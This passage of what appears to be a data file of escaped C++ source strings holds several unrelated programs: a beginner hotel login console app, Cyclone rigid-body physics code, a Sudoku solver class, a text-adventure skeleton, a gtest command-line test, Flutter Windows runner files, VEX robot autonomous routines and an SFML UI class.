\"<<endl;\r\n\t\t\tcout<<\"     *                 *     \"<<endl;\r\n\t\t\tcout<<\"     *      LOGIN      *     \"<<endl;\r\n\t\t\tcout<<\"     *                 *     \"<<endl;\r\n\t\t\tcout<<\"     * * * * * * * * * *     \"<<endl;\r\n\t\t\tdo{\r\n\t\t\tif(h1.user==h1.user1 && h1.pass==h1.pass1)\r\n\t\t\t{\r\n\t\t    cout<<\"Enter your username: \";\r\n\t\t\tcin>>h1.user;\r\n\t\t\tcout<<\"Enter your Password: \";\r\n\t\t\tcin>>h1.pass;\r\n\t\t\t\r\n\t\t\tcout<<\"LOGIN SUCCESSFUL: \";\r\n\t        }\r\n\t       \r\n\t\t    else\r\n\t        {\r\n\t\t\tcout<<\"Incorrect username or password. Please Try again.\"<<endl;\r\n\t\t\t}\r\n\t          }while(h1.user!=h1.user1 || h1.pass!=h1.pass1);\r\n\t\t}\r\n\r\nint main()\r\n{\r\n\tHotel h1;\r\n\th1.Signup(h1);\r\n\th1.Login(h1);\r\n\t\r\n\t\r\n\treturn 0;\r\n}\r\n",
    "/*\r\n * Implementation file for the rigid body class.\r\n *\r\n * Part of the Cyclone physics system.\r\n *\r\n * Copyright (c) Icosagon 2003. All Rights Reserved.\r\n *\r\n * This software is distributed under licence. Use of this software\r\n * implies agreement with all terms and conditions of the accompanying\r\n * software licence.\r\n */\r\n\r\n#include <body.h>\r\n#include <memory.h>\r\n#include <assert.h>\r\n\r\nusing namespace cyclone;\r\n\r\n\r\n/*\r\n * --------------------------------------------------------------------------\r\n * INTERNAL OR HELPER FUNCTIONS:\r\n * --------------------------------------------------------------------------\r\n */\r\n\r\n/**\r\n * Internal function that checks the validity of an inverse inertia tensor.\r\n */\r\nstatic inline void _checkInverseInertiaTensor(const Matrix3 &iitWorld)\r\n{\r\n    // TODO: Perform a validity check in an assert.\r\n}\r\n\r\n/**\r\n * Internal function to do an intertia tensor transform by a quaternion.\r\n * Note that the implementation of this function was created by an\r\n * automated code-generator and optimizer.\r\n */\r\nstatic inline void _transformInertiaTensor(Matrix3 &iitWorld,\r\n                                           const Quaternion &q,\r\n                                           const Matrix3 &iitBody,\r\n                                           const Matrix4 &rotmat)\r\n{\r\n    real t4 = rotmat.data[0]*iitBody.data[0]+\r\n        rotmat.data[1]*iitBody.data[3]+\r\n        rotmat.data[2]*iitBody.data[6];\r\n    real t9 = rotmat.data[0]*iitBody.data[1]+\r\n        rotmat.data[1]*iitBody.data[4]+\r\n        rotmat.data[2]*iitBody.data[7];\r\n    real t14 = rotmat.data[0]*iitBody.data[2]+\r\n        rotmat.data[1]*iitBody.data[5]+\r\n        rotmat.data[2]*iitBody.data[8];\r\n    real t28 = rotmat.data[4]*iitBody.data[0]+\r\n        rotmat.data[5]*iitBody.data[3]+\r\n        rotmat.data[6]*iitBody.data[6];\r\n    real t33 = rotmat.data[4]*iitBody.data[1]+\r\n        rotmat.data[5]*iitBody.data[4]+\r\n        rotmat.data[6]*iitBody.data[7];\r\n    real t38 = rotmat.data[4]*iitBody.data[2]+\r\n        rotmat.data[5]*iitBody.data[5]+\r\n        rotmat.data[6]*iitBody.data[8];\r\n    real t52 = rotmat.data[8]*iitBody.data[0]+\r\n        rotmat.data[9]*iitBody.data[3]+\r\n        rotmat.data[10]*iitBody.data[6];\r\n    real t57 = rotmat.data[8]*iitBody.data[1]+\r\n        rotmat.data[9]*iitBody.data[4]+\r\n        rotmat.data[10]*iitBody.data[7];\r\n    real t62 = rotmat.data[8]*iitBody.data[2]+\r\n        rotmat.data[9]*iitBody.data[5]+\r\n        rotmat.data[10]*iitBody.data[8];\r\n\r\n    iitWorld.data[0] = t4*rotmat.data[0]+\r\n        t9*rotmat.data[1]+\r\n        t14*rotmat.data[2];\r\n    iitWorld.data[1] = t4*rotmat.data[4]+\r\n        t9*rotmat.data[5]+\r\n        t14*rotmat.data[6];\r\n    iitWorld.data[2] = t4*rotmat.data[8]+\r\n        t9*rotmat.data[9]+\r\n        t14*rotmat.data[10];\r\n    iitWorld.data[3] = t28*rotmat.data[0]+\r\n        t33*rotmat.data[1]+\r\n        t38*rotmat.data[2];\r\n    iitWorld.data[4] = t28*rotmat.data[4]+\r\n        t33*rotmat.data[5]+\r\n        t38*rotmat.data[6];\r\n    iitWorld.data[5] = t28*rotmat.data[8]+\r\n        t33*rotmat.data[9]+\r\n        t38*rotmat.data[10];\r\n    iitWorld.data[6] = t52*rotmat.data[0]+\r\n        t57*rotmat.data[1]+\r\n        t62*rotmat.data[2];\r\n    iitWorld.data[7] = t52*rotmat.data[4]+\r\n        t57*rotmat.data[5]+\r\n        t62*rotmat.data[6];\r\n    iitWorld.data[8] = t52*rotmat.data[8]+\r\n        t57*rotmat.data[9]+\r\n        t62*rotmat.data[10];\r\n}\r\n\r\n/**\r\n * Inline function that creates a transform matrix from a\r\n * position and orientation.\r\n */\r\nstatic inline void _calculateTransformMatrix(Matrix4 &transformMatrix,\r\n                                             const Vector3 &position,\r\n                                             const Quaternion &orientation)\r\n{\r\n    transformMatrix.data[0] = 1-2*orientation.j*orientation.j-\r\n        2*orientation.k*orientation.k;\r\n    transformMatrix.data[1] = 2*orientation.i*orientation.j -\r\n        2*orientation.r*orientation.k;\r\n    transformMatrix.data[2] = 2*orientation.i*orientation.k +\r\n        2*orientation.r*orientation.j;\r\n    transformMatrix.data[3] = position.x;\r\n\r\n    transformMatrix.data[4] = 2*orientation.i*orientation.j +\r\n        2*orientation.r*orientation.k;\r\n    transformMatrix.data[5] = 1-2*orientation.i*orientation.i-\r\n        2*orientation.k*orientation.k;\r\n    transformMatrix.data[6] = 2*orientation.j*orientation.k -\r\n        2*orientation.r*orientation.i;\r\n    transformMatrix.data[7] = position.y;\r\n\r\n    transformMatrix.data[8] = 2*orientation.i*orientation.k -\r\n        2*orientation.r*orientation.j;\r\n    transformMatrix.data[9] = 2*orientation.j*orientation.k +\r\n        2*orientation.r*orientation.i;\r\n    transformMatrix.data[10] = 1-2*orientation.i*orientation.i-\r\n        2*orientation.j*orientation.j;\r\n    transformMatrix.data[11] = position.z;\r\n}\r\n\r\n/*\r\n * --------------------------------------------------------------------------\r\n * FUNCTIONS DECLARED IN HEADER:\r\n * --------------------------------------------------------------------------\r\n */\r\nvoid R",
    "//\n// Created by Jonas Langner on 31.03.24.\n//\n\n#include \"../../hdr/algorithm/SolvingOperation.h\"\n#include \"../../hdr/SudokuField.h\"\n#include \"../../hdr/algorithm/SudokuFieldSorter.h\"\n#include \"../../hdr/SudokuFieldGroup.h\"\n#include <iostream>\n\nsudoku::algorithm::SolvingOperation::SolvingOperation(SudokuField* sudoku_field_ptr, unsigned short no) noexcept:\nm_sudoku_field_ptr{sudoku_field_ptr}, m_number{no} {}\n\nsudoku::algorithm::SolvingOperation::SolvingOperation(sudoku::algorithm::SolvingOperation &&other) noexcept: m_sudoku_field_ptr{other.m_sudoku_field_ptr}, m_number{other.m_number}, m_effected_fields_by_perform{other.m_effected_fields_by_perform} {\n    other.m_sudoku_field_ptr = nullptr;\n    other.m_effected_fields_by_perform.clear();\n}\n\nsudoku::algorithm::SolvingOperation &sudoku::algorithm::SolvingOperation::operator=(sudoku::algorithm::SolvingOperation &&other) noexcept {\n    m_sudoku_field_ptr = other.m_sudoku_field_ptr;\n    m_number = other.m_number;\n    m_effected_fields_by_perform = other.m_effected_fields_by_perform;\n\n    other.m_sudoku_field_ptr = nullptr;\n    other.m_effected_fields_by_perform.clear();\n\n    return *this;\n}\n\nvoid sudoku::algorithm::SolvingOperation::for_each_related_sudoku_field_ptr(const std::function<void(SudokuField*)> &fnc) const {\n    std::for_each(m_sudoku_field_ptr->begin(), m_sudoku_field_ptr->end(), [fnc](sudoku::SudokuFieldGroup* sudoku_field_group) {\n        std::for_each(sudoku_field_group->begin(), sudoku_field_group->end(), [fnc](SudokuField* sudoku_field_ptr) {\n            fnc(sudoku_field_ptr);\n        });\n    });\n}\n\nvoid sudoku::algorithm::SolvingOperation::perform(sudoku::Sudoku &sudoku) {\n    m_sudoku_field_ptr->set_value(m_number);\n    SudokuFieldSorter &sorter{sudoku.m_sorter};\n\n    sorter.update(m_sudoku_field_ptr);\n    for_each_related_sudoku_field_ptr([this, &sorter](SudokuField* sudoku_field_ptr) {\n        if (sudoku_field_ptr->remove_number_option(m_number)) {\n            m_effected_fields_by_perform.push_back(sudoku_field_ptr);\n            sorter.update(sudoku_field_ptr);\n        }\n    });\n\n    sorter.flush();\n}\n\nvoid sudoku::algorithm::SolvingOperation::rollback(Sudoku &sudoku) noexcept {\n    auto const value{m_sudoku_field_ptr->value()};\n    m_sudoku_field_ptr->remove_value();\n\n    SudokuFieldSorter &sorter{sudoku.m_sorter};\n    sorter.update(m_sudoku_field_ptr);\n\n    std::for_each(m_effected_fields_by_perform.begin(), m_effected_fields_by_perform.end(), [&value, &sorter](SudokuField* sudoku_field_ptr){\n        if (sudoku_field_ptr->add_number_option(value)) {\n            sorter.update(sudoku_field_ptr);\n        }\n    });\n\n    sorter.flush();\n    m_effected_fields_by_perform.clear();\n}\n\nsudoku::SudokuField *sudoku::algorithm::SolvingOperation::sudoku_field() const noexcept {\n    return m_sudoku_field_ptr;\n}",
    "#include <iostream>\n#include <cstdlib>\n\n#ifdef _WIN32\n#include <curses.h>\n#else\n#include <ncurses.h>\n#endif\n\n#include \"fancy_border.cpp\"\n\nclass staticBaseCommands {\nprivate:\n    static void clearTerminal() {\n    #ifdef _WIN32\n        system(\"cls\");\n    #else\n        system(\"clear\");\n    #endif\n    }\n    static void helpMenu() {\n        initscr();          // Initialize NCurses\n        cbreak();           // Disable line buffering\n        noecho();           // Don't echo the characters typed to the screen\n        nodelay(stdscr, TRUE); // Non-blocking read\n\n        clear();\n        std::string helpMenu = \"commands:\\n\\n look - makes observation of your surroundings\\n clear - clears text in terminal\\n quit - exits game \\n\\n\";\n\n        //printBorder(helpMenu);\n        printw(helpMenu.c_str());\n        printw(\"Press 'q' to exit help menu.\\n\");\n        refresh();\n\n        int ch;\n        while((ch = getch()) != 'q') {\n            if(ch != ERR) {\n                // Process the input\n                //printw(\"You pressed: %c\\n\", ch);\n            }\n        }\n        endwin(); // End NCurses mode\n\n    }\n\n    friend class engine;\n    friend class characterCreation;\n};\n\nclass characterCreation {\npublic:\n    void base() {\n        name();\n    }\nprivate:\n    void name() {\n        std::string characterName;\n        std::string characterInfo;\n        std::string characterGender = \"joe\";\n        std::cout << \"welcome to character creation\" << std::endl;\n        std::cout << \"Enter your character name: \";\n        std::getline(std::cin, characterName);\n        characterInfo = (\"name: \" + characterName + \"\\ngender: \" + characterGender);\n        staticBaseCommands::clearTerminal();\n        printBorder(characterInfo);\n    }\n};\n\n\nclass engine {\npublic:\n    void run() {\n        while (!gameEnd) {\n            input();\n            gameUpdate();\n            render();\n        }\n    }\nprivate:\n    bool gameEnd = false;\n\n\n    void input() {\n        std::string command;\n        std::cout << \">\";\n        std::getline(std::cin, command);\n\n        if (command == \"look\") {\n            std::cout << \"you are blind\" << std::endl;\n        }\n        else if (command == \"help\") {\n            staticBaseCommands::helpMenu();\n        }\n        else if (command == \"clear\") {\n            staticBaseCommands::clearTerminal();\n        }\n        else if (command == \"\") {\n        }\n        else if (command == \"quit\") {\n            exit();\n        } else {\n            std::cout << \"unknown command\" << std::endl;\n        }\n    }\n\n    void gameUpdate() {\n\n    }\n\n    void render() {\n\n    }\n\n    static void exit() {\n        ::exit(0);\n    }\n};\n\n\nint main() {\n    characterCreation characterCreation;\n    characterCreation.base();\n    engine engine;\n    engine.run();\n    return 0;\n}\n\n",
    "#include \"clopts.hpp\"\n#include <gtest/gtest.h>\n#include <sstream>\n#include <regex>\n#include <initializer_list>\n\nnamespace{\n\nusing namespace moss;\n\n/** Test for options, which terminate the interpreter (-h/-version) */\nTEST(CmdOptions, Terminating){\n    // help\n    const char* argv[] = {\n        \"moss\", \"-h\"\n    };\n    int argc = sizeof(argv) / sizeof(argv[0]);\n\n    EXPECT_EXIT(clopts::parse_clopts(argc, argv), ::testing::ExitedWithCode(0), \"\");\n    \n    // version\n    const char* argv2[] = {\n        \"moss\", \"--version\"\n    };\n    int argc2 = sizeof(argv2) / sizeof(argv2[0]);\n\n    EXPECT_EXIT(clopts::parse_clopts(argc2, argv2), ::testing::ExitedWithCode(0), \"\");\n\n    // file followed by program argument\n    const char* argv3[] = {\n        \"moss\", \"--nonexistentflag42\", \"and one more\"\n    };\n    int argc3 = sizeof(argv3) / sizeof(argv3[0]);\n\n    // Test that we dont exit with other code that 0, force 0 after no exit\n    EXPECT_EXIT(clopts::parse_clopts(argc3, argv3), testing::ExitedWithCode(1), \".*Flag could not be matched.*\");\n}\n\n/** Correct command line options, that should not terminate the program */\nTEST(CmdOptions, NonTerminating) {\n    // file followed by program argument\n    const char* argv[] = {\n        \"moss\", \"program.ms\", \"--nonexistentflag42\", \"and one more\"\n    };\n    int argc = sizeof(argv) / sizeof(argv[0]);\n\n    // Test that we dont exit with other code that 0, force 0 after no exit\n    ASSERT_EXIT( { clopts::parse_clopts(argc, argv); exit(0); },\n            testing::ExitedWithCode(0),\n            \"\");\n\n    clopts::parse_clopts(argc, argv);\n    EXPECT_TRUE(args::get(clopts::file_name) == std::string(\"program.ms\"));\n    EXPECT_FALSE(clopts::code);\n\n    // code string followed by program argument\n    const char* argv1[] = {\n        \"moss\", \"-e\", \"print(\\\"hi\\\");\", \"--nonexistentflag42\", \"and one more\"\n    };\n    int argc1 = sizeof(argv1) / sizeof(argv1[0]);\n\n    // Test that we dont exit with other code that 0, force 0 after no exit\n    EXPECT_EXIT( { clopts::parse_clopts(argc1, argv1); exit(0); },\n            testing::ExitedWithCode(0),\n            \"\");\n\n    clopts::parse_clopts(argc1, argv1);\n    EXPECT_TRUE(clopts::code);\n    EXPECT_FALSE(clopts::file_name);\n}\n\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"yes_no_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"autons.hpp\"\r\n#include \"EZ-Template/drive/drive.hpp\"\r\n#include \"EZ-Template/util.hpp\"\r\n#include \"main.h\"\r\n#include \"globals.h\"\r\n#include \"pros/rtos.hpp\"\r\n\r\n/////\r\n// For installation, upgrading, documentations and tutorials, check out our website!\r\n// https://ez-robotics.github.io/EZ-Template/\r\n/////\r\n\r\n// These are out of 127\r\nint DRIVE_SPEED = 110;  \r\nint TURN_SPEED = 90;\r\nint SWING_SPEED = 90;\r\n\r\n///\r\n// Constants\r\n///\r\nvoid default_constants() {\r\n  chassis.pid_heading_constants_set(3, 0, 20);\r\n  chassis.pid_drive_constants_set(10, 0, 100);\r\n  chassis.pid_turn_constants_set(3, 0, 20);\r\n  chassis.pid_swing_constants_set(5, 0, 30);\r\n\r\n  chassis.pid_turn_exit_condition_set(300_ms, 3_deg, 175_ms, 7_deg, 750_ms, 750_ms);\r\n  chassis.pid_swing_exit_condition_set(300_ms, 3_deg, 175_ms, 7_deg, 750_ms, 750_ms);\r\n  chassis.pid_drive_exit_condition_set(300_ms, 1_in, 175_ms, 3_in, 750_ms, 750_ms);\r\n\r\n  chassis.slew_drive_constants_set(7_in, 80);\r\n}\r\n\r\nvoid FWD(int distance, bool slew) {\r\n  chassis.pid_drive_set(distance, DRIVE_SPEED, slew);\r\n  chassis.pid_wait();\r\n\r\n}\r\n\r\nvoid REV(int distance, bool slew) {\r\n  chassis.pid_drive_set(-distance, DRIVE_SPEED, slew);\r\n  chassis.pid_wait();\r\n}\r\n\r\nvoid TURN(int degrees, bool slew) {\r\n  chassis.pid_turn_set(degrees, TURN_SPEED, slew);\r\n  chassis.pid_wait();\r\n}\r\n\r\n\r\n\r\nvoid closeWP() {\r\n  DRIVE_SPEED = 127;\r\n  TURN_SPEED = 50;\r\n  chassis.pid_drive_set(20, 62, false);\r\n  chassis.pid_wait();\r\n  \r\n  /*\r\n  chassis.pid_drive_set(59, 62, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(-90, TURN_SPEED, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(40, 62, false);\r\n  chassis.pid_wait();\r\n  Intake.move_voltage(6000); \r\n  chassis.pid_wait();\r\n  pros::delay(2000);\r\n  chassis.pid_drive_set(-40, 62, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(-180, TURN_SPEED, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(50, 62, false);\r\n  chassis.pid_wait();\r\n  Intake.move_voltage(-6000);\r\n  chassis.pid_wait();\r\n  pros::delay(2000);\r\n  Intake.move_voltage(0);\r\n\r\n  chassis.pid_turn_set(20_deg, TURN_SPEED, true);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(16_in, DRIVE_SPEED, true);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(-25_deg, TURN_SPEED, true);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(3_in, DRIVE_SPEED, true);\r\n  chassis.pid_wait();\r\n  backWings.set_value(true);\r\n  chassis.pid_drive_set(16_in, DRIVE_SPEED, true);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(-68_deg, TURN_SPEED, true);\r\n  chassis.pid_wait();\r\n  backWings.set_value(false);\r\n  intakeRelease.set_value(true);\r\n  pros::delay(200);\r\n  Intake.move_voltage(-12000); \r\n  chassis.pid_drive_set(37_in, DRIVE_SPEED, true); \r\n  chassis.pid_wait();*/\r\n  \r\n}\r\n\r\nvoid closeRush() {\r\n  DRIVE_SPEED = 127;\r\n  TURN_SPEED = 127;\r\n  \r\n\r\n  /*\r\n  chassis.pid_drive_set(38, 62, false);\r\n  chassis.pid_wait();\r\n  Intake.move_voltage(10000);\r\n  pros::delay(2000);\r\n  chassis.pid_drive_set(-20, 62, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(90, TURN_SPEED, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(68, 62, false);\r\n  chassis.pid_wait();\r\n  Intake.move_voltage(-10000);\r\n  pros::delay(2000);\r\n  Intake.move_voltage(0);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(-75, 62, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(0, TURN_SPEED, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(18, 62, false);\r\n  chassis.pid_wait();\r\n  Intake.move_voltage(10000);\r\n  pros::delay(2000);\r\n  chassis.pid_drive_set(-18, 62, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(90, TURN_SPEED, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(68, 62, false);\r\n  chassis.pid_wait();\r\n  Intake.move_voltage(-10000);\r\n  pros::delay(2000);\r\n  Intake.move_voltage(0);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(-82, 62, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(0, TURN_SPEED, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(-20, 62, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(-20, 62, false);\r\n  */\r\n}\r\n\r\n\r\nvoid farSideRush() {\r\n  DRIVE_SPEED = 127;\r\n  TURN_SPEED = 127;\r\n  Intake.move_voltage(12000);\r\n  frontWings.set_value(true);\r\n  pros::delay(100);\r\n  frontWings.set_value(false);\r\n  intakeRelease.set_value(true);\r\n  chassis.pid_drive_set(57_in, DRIVE_SPEED);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(-52.5, 127, false);\r\n  chassis.pid_wait();\r\n  backWings.set_value(true);\r\n  chassis.pid_drive_set(-31_in, DRIVE_SPEED, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(10_in, DRIVE_SPEED, false);\r\n  backWings.set_value(false);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(-230, TURN_SPEED, false);\r\n  chassis.pid_wait();\r\n  Intake.move_voltage(-12000);\r\n  chassis.pid_drive_set(12_in, DRIVE_SPEED, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_drive_set(-21_in, DRIVE_SPEED, false);\r\n  chassis.pid_wait();\r\n  chassis.pid_turn_set(-110.59, TURN_SPEED, false);\r\n  chassis.pid_wait();\r\n  Intake.move_voltage(12000);\r\n  chassis.pid_drive_set(15_in, DRI",
    "#include \"UserInterface.h\"\n\n\ngui::UserInterface::UserInterface(const uint32_t maxWidgets)\n    : eventInfo(), active(false), currentIndex(0u), keyNames({\n        {sf::Keyboard::A, \"A\"},     {sf::Keyboard::B, \"B\"}, {sf::Keyboard::C, \"C\"},\n        {sf::Keyboard::D, \"D\"},     {sf::Keyboard::E, \"E\"}, {sf::Keyboard::F, \"F\"},\n        {sf::Keyboard::G, \"G\"},     {sf::Keyboard::H, \"H\"}, {sf::Keyboard::I, \"I\"},\n        {sf::Keyboard::J, \"J\"},     {sf::Keyboard::K, \"K\"}, {sf::Keyboard::L, \"L\"},\n        {sf::Keyboard::M, \"M\"},     {sf::Keyboard::N, \"N\"}, {sf::Keyboard::O, \"O\"},\n        {sf::Keyboard::P, \"P\"},     {sf::Keyboard::Q, \"Q\"}, {sf::Keyboard::R, \"R\"},\n        {sf::Keyboard::S, \"S\"},     {sf::Keyboard::T, \"T\"}, {sf::Keyboard::U, \"U\"},\n        {sf::Keyboard::V, \"V\"},     {sf::Keyboard::W, \"W\"}, {sf::Keyboard::X, \"X\"},\n        {sf::Keyboard::Y, \"Y\"},     {sf::Keyboard::Z, \"Z\"},\n\n        {sf::Keyboard::Num0, \"0\"},  {sf::Keyboard::Num1, \"1\"}, {sf::Keyboard::Num2, \"2\"},\n        {sf::Keyboard::Num3, \"3\"},  {sf::Keyboard::Num4, \"4\"}, {sf::Keyboard::Num5, \"5\"},\n        {sf::Keyboard::Num6, \"6\"},  {sf::Keyboard::Num7, \"7\"}, {sf::Keyboard::Num8, \"8\"},\n        {sf::Keyboard::Num9, \"9\"},\n\n        {sf::Keyboard::Space, \"Space\"},         {sf::Keyboard::LControl, \"Left Ctrl\"},\n        {sf::Keyboard::LShift, \"Left Shift\"},   {sf::Keyboard::RControl, \"Right Ctrl\"},\n        {sf::Keyboard::RShift, \"Right Shift\"},  {sf::Keyboard::Tab, \"Tab\"},\n        {sf::Keyboard::Escape, \"Esc\"},          {sf::Keyboard::Enter, \"Enter\"}\n        })\n{\n    this->widgets.reserve(maxWidgets);\n    clock.restart();\n}\n\nvoid gui::UserInterface::addWidget(std::unique_ptr<Widget> element)\n{\n    widgets.push_back(std::move(element));\n}\n\nvoid gui::UserInterface::update()\n{\n    if (sf::Mouse::isButtonPressed(sf::Mouse::Left) && clock.getElapsedTime().asSeconds() >= 0.2f)\n    {\n        eventInfo.mousePressed = !eventInfo.mousePressed;\n        clock.restart();\n    }\n\n    for (unsigned int index = 0; index < widgets.size(); index++)\n    {\n        Widget* widget = widgets[index].get();\n\n        if (widget->update(eventInfo))\n        {\n            active = true;\n            currentIndex = index;\n            break;\n        }\n    }\n}\n\nvoid gui::UserInterface::render(sf::RenderTarget& target)\n{ \n    eventInfo.mousePosition = target.mapPixelToCoords(sf::Mouse::getPosition());\n    \n    for (const auto& widget : widgets)\n    {\n        widget->render(target);\n    }\n}\n\nvoid gui::UserInterface::handleEvent(sf::Event& event)\n{\n    if (!active)\n    {\n        return;\n    }\n\n    const auto it = keyNames.find(event.key.code);\n\n    switch (event.type)\n    {\n    case sf::Event::KeyPressed:\n        eventInfo.key = event.key.code;\n\n        if (it != keyNames.end())\n        {\n            eventInfo.textInput = it->second;\n            eventInfo.keyPressed = true;\n            active = false;\n        }\n        else\n        {\n            eventInfo.textInput = nullptr;\n        }\n        break;\n\n\n    default:\n        break;\n    }\n}\n\nconst 